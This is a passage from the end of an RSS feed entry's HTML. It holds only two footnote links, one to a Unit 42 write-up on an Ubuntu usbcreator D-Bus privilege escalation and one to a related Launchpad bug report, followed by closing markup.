<p><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p><a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149">https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
